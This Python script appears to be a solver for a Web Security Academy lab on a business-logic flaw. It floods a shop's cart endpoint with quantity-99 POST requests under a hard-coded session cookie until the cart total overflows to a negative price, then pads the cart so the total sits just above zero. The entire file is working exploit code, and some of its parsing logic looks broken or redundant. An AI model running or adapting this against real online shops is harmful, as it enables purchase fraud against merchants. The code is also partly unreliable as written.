import requests
import re


target1 = "https://acf91fd81f57a0bdc0b133d500e400bd.web-security-academy.net/cart"
post_data = {'productId': '1', 'redir': 'PRODUCT', 'quantity': '99'}
post_data2 = {'productId': '2', 'redir': 'PRODUCT', 'quantity': '99'}
session_id = "IphkI5Nuku8K90vAmqXCfygw64OlHC6W"
session_cookie = {'session': session_id}
check_cart = re.compile("<th>[/-]?\$\d+\.\d+</th>")




def overflow():
    response = requests.get(target1, cookies=session_cookie)
    match = re.findall(check_cart, response.text)
    if '-' in match[0]:
        cart_value = cart_value = -int(match[0].split('$')[1].split('.')[0])
    else:
        cart_value = int(match[0].split('$')[1].split('.')[0])
    while cart_value > 0:
        requests.post(target1, cookies=session_cookie, data=post_data)
        response = requests.get(target1, cookies=session_cookie)
        match = re.findall(check_cart, response.text)
        response = requests.get(target1, cookies=session_cookie)
        match = re.findall(check_cart, response.text)
        if '-' in match[0]:
            cart_value = cart_value = -int(match[0].split('$')[1].split('.')[0])
        else:
            cart_value = int(match[0].split('$')[1].split('.')[0])
        print(f'CART VALUE: ${cart_value}')
    print(f'CART VALUE NEGATIVE')
    while cart_value < -200000:
        requests.post(target1, cookies=session_cookie, data=post_data)
        response = requests.get(target1, cookies=session_cookie)
        match = re.findall(check_cart, response.text)
        response = requests.get(target1, cookies=session_cookie)
        match = re.findall(check_cart, response.text)
        cart_value = -int(match[0].split('$')[1].split('.')[0])
        print(f'CART VALUE: ${cart_value}')
    while cart_value < 1:
        requests.post(target1, cookies=session_cookie, data=post_data2)
        response = requests.get(target1, cookies=session_cookie)
        match = re.findall(check_cart, response.text)
        response = requests.get(target1, cookies=session_cookie)
        match = re.findall(check_cart, response.text)
        cart_value = -int(match[0].split('$')[1].split('.')[0])
        print(f'CART VALUE: ${cart_value}')

    print(f'CART VALUE: ${cart_value}')

overflow()